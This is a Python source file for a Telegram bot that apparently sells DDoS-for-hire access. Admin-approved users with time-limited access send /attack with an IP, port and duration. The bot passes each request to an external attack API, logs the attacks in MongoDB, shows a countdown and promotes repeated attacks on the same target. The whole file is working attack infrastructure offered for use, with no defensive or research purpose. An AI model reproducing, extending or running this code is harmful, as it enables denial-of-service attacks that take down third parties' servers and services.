import asyncio
import logging
import requests
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
import re
from functools import wraps
import uuid
import os
from dotenv import load_dotenv

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "7252677891").split(",")]

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT, MAX_PORT = 1, 65535

# Dictionary to track active countdowns per user (for cleanup)
active_countdowns = {}

def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# Database Class
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        
        try:
            self.users.delete_many({"user_id": None})
            self.users.delete_many({"user_id": {"$exists": False}})
        except Exception as e:
            logger.error(f"Error cleaning: {e}")
        
        try:
            self.users.drop_indexes()
            self.attacks.drop_indexes()
        except:
            pass
        
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])
        self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
        
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id, "username": username, "approved": False,
            "approved_at": None, "expires_at": None, "total_attacks": 0,
            "created_at": get_current_time(), "is_banned": False
        }
        try:
            self.users.insert_one(user_data)
        except:
            pass
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "expires_at": None}}
        )
        return result.modified_count > 0
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
            "duration": duration, "status": status, "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        try:
            self.attacks.insert_one(attack_data)
            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
        except Exception as e:
            logger.error(f"Failed to log: {e}")
    
    def get_all_users(self) -> List[Dict]:
        return list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
    
    def get_user_attack_stats(self, user_id: int) -> Dict:
        total = self.attacks.count_documents({"user_id": user_id})
        success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        return {"total": total, "successful": success, "failed": failed, "recent": recent}

db = Database()
print("✅ Database connected!")

def is_port_blocked(port: int) -> bool:
    return port in BLOCKED_PORTS

def get_blocked_ports_list() -> str:
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

def admin_required(func):
    @wraps(func)
    async def wrapper(update, context):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized.")
            return
        return await func(update, context)
    return wrapper

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"):
        return False
    expires_at = user.get("expires_at")
    if expires_at:
        expires_at = make_aware(expires_at)
        if expires_at < get_current_time():
            return False
    return True

def launch_attack(ip: str, port: int, duration: int) -> Dict:
    """Launch attack - DUPLICATE ALLOWED (koi restriction nahi)"""
    try:
        params = {
            "api_key": API_KEY,
            "target": ip,
            "port": port,
            "time": duration,
            "concurrent": 1
        }
        
        response = requests.get(f"{API_URL}/api/attack", params=params, timeout=15)
        
        try:
            result = response.json()
        except:
            result = {"error": response.text, "success": False}
        
        # Attack successful even if same IP (no duplicate check)
        if response.status_code == 200:
            result["success"] = True
        else:
            result["success"] = False
        return result
    except Exception as e:
        return {"error": str(e), "success": False}

# COUNTDOWN FUNCTION - Ye REAL-TIME UPDATE karega
async def run_countdown(message, duration: int, ip: str, port: int, user_id: int):
    """Real-time countdown timer - updates every second"""
    target = f"{ip}:{port}"
    countdown_id = f"{user_id}_{ip}_{port}"
    
    # Store countdown id
    active_countdowns[countdown_id] = True
    
    try:
        for remaining in range(duration, -1, -1):
            # Check if countdown was cancelled
            if countdown_id in active_countdowns and not active_countdowns[countdown_id]:
                break
            
            if remaining > 0:
                # Create progress bar (20 characters)
                progress = int((duration - remaining) * 20 / duration)
                bar = "█" * progress + "░" * (20 - progress)
                
                text = (
                    f"🎯 **ATTACK IN PROGRESS**\n\n"
                    f"📍 Target: `{target}`\n"
                    f"⏱️ Time Left: **{remaining} seconds**\n\n"
                    f"┌─────────────────┐\n"
                    f"│ {bar} │\n"
                    f"└─────────────────┘\n\n"
                    f"⚔️ Multiple attacks allowed on same IP!"
                )
                try:
                    await message.edit_text(text, parse_mode='Markdown')
                except:
                    pass
                await asyncio.sleep(1)
            else:
                # Final message when attack finishes
                text = (
                    f"✅ **ATTACK FINISHED!**\n\n"
                    f"📍 Target: `{target}`\n"
                    f"⏱️ Total Duration: **{duration} seconds**\n\n"
                    f"✨ Attack completed successfully!\n"
                    f"💡 You can launch another attack now."
                )
                try:
                    await message.edit_text(text, parse_mode='Markdown')
                except:
                    pass
    finally:
        # Cleanup
        active_countdowns.pop(countdown_id, None)

# COMMANDS
@admin_required
async def approve_command(update, context):
    try:
        if len(context.args) < 2:
            await update.message.reply_text("❌ Usage: /approve <user_id> <days>")
            return
        user_id = int(context.args[0])
        days = int(context.args[1])
        if days <= 0:
            await update.message.reply_text("❌ Days must be positive.")
            return
        if not db.get_user(user_id):
            db.create_user(user_id)
        if db.approve_user(user_id, days):
            expires_at = get_current_time() + timedelta(days=days)
            await update.message.reply_text(f"✅ User {user_id} approved for {days} days!\nExpires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')} UTC")
            try:
                await context.bot.send_message(user_id, f"✅ Your account has been approved for {days} days!\nUse /help to see commands.")
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to approve.")
    except:
        await update.message.reply_text("❌ Invalid input.")

@admin_required
async def users_command(update, context):
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("📭 No users found.")
        return
    approved = sum(1 for u in users if u.get("approved"))
    msg = f"👥 Users: {len(users)}\n✅ Approved: {approved}\n❌ Pending: {len(users)-approved}\n\n📋 List:\n"
    for i, u in enumerate(users[:15], 1):
        status = "✅" if u.get("approved") else "❌"
        msg += f"{i}. {u.get('user_id')} {status} - {u.get('total_attacks',0)} attacks\n"
    await update.message.reply_text(msg)

@admin_required
async def stats_command(update, context):
    users = db.get_all_users()
    approved = [u for u in users if u.get("approved")]
    total_attacks = sum(u.get("total_attacks", 0) for u in users)
    msg = f"📊 Bot Stats\n\n👥 Total Users: {len(users)}\n✅ Approved: {len(approved)}\n🎯 Total Attacks: {total_attacks}\n🚫 Blocked Ports: {len(BLOCKED_PORTS)}"
    await update.message.reply_text(msg)

@admin_required
async def blocked_ports_command(update, context):
    await update.message.reply_text(f"🚫 Blocked Ports:\n{get_blocked_ports_list()}\n\n✅ Use any other port (1-65535)")

async def start_command(update, context):
    user_id = update.effective_user.id
    username = update.effective_user.username
    if not db.get_user(user_id):
        db.create_user(user_id, username)
    if await is_user_approved(user_id):
        await update.message.reply_text(f"✅ Welcome {username}!\nYour account is active.\nUse /help for commands.")
    else:
        await update.message.reply_text(f"❌ Access Denied, {username}!\nYour account is not approved. Contact admin.")

async def attack_command(update, context):
    user_id = update.effective_user.id
    
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ You are not approved.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(f"❌ Usage: /attack <ip> <port> <duration>\nExample: /attack 8.8.8.8 80 60\n\n🚫 Blocked: {get_blocked_ports_list()}")
        return
    
    ip, port_str, duration_str = context.args
    
    # Validate IP
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await update.message.reply_text("❌ Invalid IP address format.")
        return
    
    # Validate port
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be between 1-65535.")
            return
        if is_port_blocked(port):
            await update.message.reply_text(f"❌ Port {port} is blocked!\nAllowed ports: {get_blocked_ports_list()}")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid port number.")
        return
    
    # Validate duration
    try:
        duration = int(duration_str)
        if duration < 1 or duration > 300:
            await update.message.reply_text("❌ Duration must be between 1-300 seconds.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid duration.")
        return
    
    # Send initial message
    status_msg = await update.message.reply_text(
        f"🎯 Launching attack on `{ip}:{port}` for `{duration}` seconds...\n⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    # Launch attack (DUPLICATE ALLOWED - no check)
    response = launch_attack(ip, port, duration)
    
    if response.get("success"):
        # Log successful attack
        db.log_attack(user_id, ip, port, duration, "success", str(response))
        
        # Update message
        await status_msg.edit_text(
            f"✅ **ATTACK LAUNCHED!**\n\n📍 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}` sec\n\n🔄 Starting countdown...",
            parse_mode='Markdown'
        )
        
        # Start countdown
        await run_countdown(status_msg, duration, ip, port, user_id)
    else:
        error_msg = response.get("error", "Unknown error")
        await status_msg.edit_text(
            f"❌ **Attack Failed!**\n\nError: `{error_msg}`\n\nPossible reasons:\n• Invalid parameters\n• Port is blocked\n• Rate limit exceeded\n• Service unavailable",
            parse_mode='Markdown'
        )
        db.log_attack(user_id, ip, port, duration, "failed", str(response))

async def myattacks_command(update, context):
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved.")
        return
    
    # Get recent attacks from database
    stats = db.get_user_attack_stats(user_id)
    recent = stats.get('recent', [])[:5]
    
    if recent:
        msg = "📋 **Your Recent Attacks**\n\n"
        for attack in recent:
            status = "✅" if attack.get('status') == 'success' else "❌"
            msg += f"{status} `{attack.get('ip')}:{attack.get('port')}` - {attack.get('duration')}s\n"
        await update.message.reply_text(msg, parse_mode='Markdown')
    else:
        await update.message.reply_text("📭 No attacks found. Use /attack to start!")

async def myinfo_command(update, context):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    if not user:
        await update.message.reply_text("❌ User not found. Use /start first.")
        return
    if user.get("approved"):
        expires_at = user.get("expires_at")
        if expires_at:
            expires_at = make_aware(expires_at)
            days = (expires_at - get_current_time()).days
            expires = f"{days} days left" if days >= 0 else "Expired"
        else:
            expires = "Never"
        msg = f"📋 **Your Account Info**\n\n🆔 ID: `{user['user_id']}`\n✅ Status: Approved\n⏰ Expires: {expires}\n📊 Total Attacks: {user.get('total_attacks', 0)}"
    else:
        msg = f"❌ **Account Not Approved**\n\n🆔 ID: `{user['user_id']}`\nContact admin for access."
    await update.message.reply_text(msg, parse_mode='Markdown')

async def mystats_command(update, context):
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved.")
        return
    stats = db.get_user_attack_stats(user_id)
    rate = (stats['successful']/stats['total']*100) if stats['total'] > 0 else 0
    msg = f"📊 **Your Attack Stats**\n\n🎯 Total: `{stats['total']}`\n✅ Success: `{stats['successful']}`\n❌ Failed: `{stats['failed']}`\n📈 Rate: `{rate:.1f}%`"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def help_command(update, context):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    is_approved = await is_user_approved(user_id)
    
    msg = "🤖 **Bot Commands**\n\n"
    msg += "📱 **User Commands:**\n"
    msg += "🔹 /start - Start the bot\n"
    msg += "🔹 /help - Show this menu\n"
    msg += "🔹 /myinfo - Your account info\n"
    msg += "🔹 /mystats - Your attack stats\n"
    msg += "🔹 /myattacks - Recent attacks\n"
    msg += "🔹 /blockedports - Blocked ports list\n"
    
    if is_approved:
        msg += "\n⚔️ **Attack Command:**\n"
        msg += "🔹 /attack IP PORT DURATION - Launch attack (1-300 sec)\n"
        msg += "   Example: `/attack 1.2.3.4 80 60`\n"
        msg += "   ✅ Duplicate attacks allowed on same IP!"
    
    if is_admin:
        msg += "\n👑 **Admin Commands:**\n"
        msg += "🔹 /approve ID DAYS - Approve user\n"
        msg += "🔹 /users - List all users\n"
        msg += "🔹 /stats - Bot statistics\n"
        msg += "🔹 /blockedports - Blocked ports list\n"
    
    msg += "\n⚠️ **Disclaimer:** Misuse will result in ban."
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def blocked_ports_user_command(update, context):
    await update.message.reply_text(
        f"🚫 **Blocked Ports**\n\n{get_blocked_ports_list()}\n\n✅ All other ports (1-65535) are allowed.\n💡 Recommended: 80, 8080, 25565, 443",
        parse_mode='Markdown'
    )

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ An error occurred. Please try again later.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Admin commands
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_command))
    
    # User commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("myattacks", myattacks_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_user_command))
    
    application.add_error_handler(error_handler)
    
    print("🤖 Bot is starting...")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"🌐 API URL: {API_URL}")
    print(f"🚫 Blocked Ports: {get_blocked_ports_list()}")
    print("✅ Bot is running! (Countdown + Multi-attack enabled)")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
